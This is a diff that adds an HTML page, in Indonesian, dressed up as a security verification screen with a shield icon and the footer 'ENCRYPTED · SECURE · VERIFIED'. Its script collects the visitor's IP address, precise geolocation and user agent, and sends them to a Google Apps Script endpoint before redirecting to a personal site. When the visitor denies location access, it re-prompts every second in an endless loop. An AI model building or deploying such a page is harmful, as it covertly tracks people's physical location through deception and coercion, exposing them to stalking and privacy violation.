@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #030303;
+            --accent: #00ff88;
+            --accent2: #00cfff;
+            --dim: #0a0a0a;
+            --border: rgba(0,255,136,0.15);
+            --text: #c8d6c8;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Rajdhani', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Radial glow center */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 700px;
+            height: 700px;
+            background: radial-gradient(ellipse, rgba(0,255,136,0.04) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: min(520px, 92vw);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 32px;
+        }
+
+        /* Top badge */
+        .badge {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 11px;
+            letter-spacing: 4px;
+            color: var(--accent);
+            opacity: 0.7;
+            text-transform: uppercase;
+            animation: fadeSlideDown 0.8s ease both;
+        }
+
+        /* Shield icon */
+        .shield-wrap {
+            position: relative;
+            animation: fadeSlideDown 0.9s ease both;
+        }
+
+        .shield-ring {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 1px solid rgba(0,255,136,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            animation: ringPulse 3s ease-in-out infinite;
+        }
+
+        .shield-ring::before {
+            content: '';
+            position: absolute;
+            inset: -12px;
+            border-radius: 50%;
+            border: 1px solid rgba(0,255,136,0.08);
+            animation: ringPulse 3s ease-in-out infinite 0.5s;
+        }
+
+        .shield-svg {
+            width: 44px;
+            height: 44px;
+            fill: none;
+            stroke: var(--accent);
+            stroke-width: 1.5;
+            filter: drop-shadow(0 0 8px rgba(0,255,136,0.5));
+        }
+
+        /* Card */
+        .card {
+            width: 100%;
+            background: rgba(10,12,10,0.8);
+            border: 1px solid var(--border);
+            border-radius: 2px;
+            padding: 40px;
+            position: relative;
+            backdrop-filter: blur(12px);
+            animation: fadeSlideUp 1s ease both 0.2s;
+        }
+
+        /* Corner decorations */
+        .card::before, .card::after {
+            content: '';
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            border-color: var(--accent);
+            border-style: solid;
+            opacity: 0.6;
+        }
+        .card::before { top: -1px; left: -1px; border-width: 1px 0 0 1px; }
+        .card::after  { bottom: -1px; right: -1px; border-width: 0 1px 1px 0; }
+
+        .card-corner-tr, .card-corner-bl {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            border-color: var(--accent);
+            border-style: solid;
+            opacity: 0.6;
+        }
+        .card-corner-tr { top: -1px; right: -1px; border-width: 1px 1px 0 0; }
+        .card-corner-bl { bottom: -1px; left: -1px; border-width: 0 0 1px 1px; }
+
+        .card-header {
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .headline {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: #fff;
+            line-height: 1.2;
+            margin-bottom: 10px;
+        }
+
+        .headline span {
+            color: var(--accent);
+            text-shadow: 0 0 20px rgba(0,255,136,0.4);
+        }
+
+        .subtext {
+            font-size: 14px;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+            color: rgba(200,214,200,0.55);
+            line-height: 1.6;
+        }
+
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.2), transparent);
+            margin: 24px 0;
+        }
+
+        /* Status bar */
+        .status-bar {
+            background: rgba(0,255,136,0.04);
+            border: 1px solid rgba(0,255,136,0.1);
+            border-radius: 2px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent);
+            box-shadow: 0 0 6px var(--accent);
+            flex-shrink: 0;
+            animation: blink 1.5s ease-in-out infinite;
+        }
+
+        .status-dot.error { background: #ff4455; box-shadow: 0 0 6px #ff4455; animation: none; }
+        .status-dot.success { background: var(--accent); animation: none; }
+
+        #status {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12px;
+            letter-spacing: 1px;
+            color: rgba(200,214,200,0.8);
+        }
+
+        #status h3 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--accent);
+            letter-spacing: 1px;
+        }
+
+        /* Progress bar */
+        .progress-wrap {
+            height: 2px;
+            background: rgba(0,255,136,0.08);
+            border-radius: 1px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            width: 0%;
+            transition: width 0.5s ease;
+            box-shadow: 0 0 8px rgba(0,255,136,0.6);
+        }
+
+        .progress-label {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10px;
+            color: rgba(0,255,136,0.4);
+            letter-spacing: 2px;
+            text-align: right;
+        }
+
+        /* Footer */
+        .footer-note {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 10px;
+            color: rgba(200,214,200,0.2);
+            letter-spacing: 2px;
+            text-align: center;
+            animation: fadeSlideUp 1s ease both 0.5s;
+        }
+
+        @keyframes fadeSlideDown { from { opacity: 0; transform: translateY(-16px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeSlideUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes ringPulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
+
+        .scanline {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: 60px;
+            background: linear-gradient(transparent, rgba(0,255,136,0.015), transparent);
+            animation: scanline 6s linear infinite;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="scanline"></div>
+
+    <div class="container">
+        <div class="badge">Brian Fauzan Lukman</div>
+
+        <div class="shield-wrap">
+            <div class="shield-ring">
+                <svg class="shield-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2L3 6v6c0 5.25 3.75 10.15 9 11.25C17.25 22.15 21 17.25 21 12V6L12 2z"/>
+                    <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-corner-tr"></div>
+            <div class="card-corner-bl"></div>
+
+            <div class="card-header">
+                <div class="headline">Click <span>Allow</span> to access<br>my website</div>
+                <div class="subtext">Welcome to my Website.</div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="status-bar">
+                <div class="status-dot" id="status-dot"></div>
+                <div id="status">Menginisialisasi sistem keamanan...</div>
+            </div>
+
+            <div class="progress-wrap">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <div class="progress-label" id="progress-label">0%</div>
+        </div>
+
+        <div class="footer-note">ENCRYPTED · SECURE · VERIFIED</div>
+    </div>
+
+    <script>
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbySG8h3NAW8DpLkwFRbgKb1-vx4nOmzAno-S3jkIyoT6rLCbLEW8s1-o2uxdFaQtRgVPA/exec";
+        const REDIRECT_URL = "https://brianfauzanlukman.com";
+        let userIP = "Tidak terdeteksi";
+
+        const statusEl   = document.getElementById('status');
+        const dotEl      = document.getElementById('status-dot');
+        const progressEl = document.getElementById('progress-bar');
+        const labelEl    = document.getElementById('progress-label');
+
+        function setProgress(pct) {
+            progressEl.style.width = pct + '%';
+            labelEl.textContent = pct + '%';
+        }
+
+        function setStatus(msg, state = 'loading') {
+            statusEl.innerHTML = msg;
+            dotEl.className = 'status-dot';
+            if (state === 'error')   dotEl.classList.add('error');
+            if (state === 'success') dotEl.classList.add('success');
+        }
+
+        // 1. Ambil IP
+        async function getIP() {
+            setStatus('Mengambil IP address...'); setProgress(20);
+            try {
+                const res  = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIP = data.ip;
+            } catch (e) { userIP = "Hidden/VPN"; }
+            setProgress(40);
+            getLocation();
+        }
+
+        // 2. Ambil Geolokasi
+        function getLocation() {
+            setStatus('Clik Allow', 'loading'); 
+            setProgress(55);
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            } else {
+                setStatus('Browser tidak mendukung geolokasi.', 'error');
+            }
+        }
+
+        // 3. Kirim data & Redirect
+        function sendData(position) {
+            setStatus('Memverifikasi & mengirim data...'); setProgress(80);
+            const payload = {
+                ip: userIP,
+                lat: position.coords.latitude,
+                long: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                userAgent: navigator.userAgent
+            };
+            
+            fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) })
+                .then(() => {
+                    setProgress(100);
+                    setStatus('<h3>✓ &nbsp;Verifikasi Berhasil</h3>', 'success');
+                    
+                    // Redirect otomatis setelah 1.5 detik
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                })
+                .catch(() => {
+                    setStatus('Gagal sinkronisasi data.', 'error');
+                });
+        }
+
+        // 4. Jika Deny (Looping)
+        function showError(error) {
+            setStatus('Loading...', 'error');
+            setProgress(0);
+            
+            // Panggil kembali getLocation setelah 1 detik untuk memunculkan pop up lagi
+            setTimeout(() => {
+                getLocation();
+            }, 1000);
+        }
+
+        // Jalankan sistem
+        window.onload = getIP;
+    </script>
+</body>
+</html>
